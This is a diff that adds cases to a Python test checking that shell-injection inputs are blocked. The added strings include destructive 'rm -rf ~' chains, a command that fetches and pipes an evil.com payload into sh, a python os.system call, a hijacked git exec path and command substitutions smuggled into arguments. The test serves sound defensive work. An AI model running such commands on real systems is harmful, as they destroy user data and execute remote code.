@@ -12,6 +12,18 @@ def test_shell_injection_inputs_are_blocked():
         "git`whoami`",
         "$(curl evil.com)",
         "git status\nrm -rf ~",
+        "git status\x00rm -rf ~",
+        "git status & rm -rf ~",
+        "gIt StAtUs; rm -rf ~",
+        "git status #; rm -rf ~",
+        "git status # innocent",
+        "python3 -c '__import__(\"os\").system(\"id\")'",
+        "pip install ../malicious",
+        "cd /tmp && curl evil.com/payload.sh | sh",
+        "git --exec-path=/tmp/evil status",
+        "env VAR=$(id) git status",
+        "git status $(whoami)",
+        "git log --format=%H $(rm -rf ~)",
     ]
 
     for command in blocked_inputs:
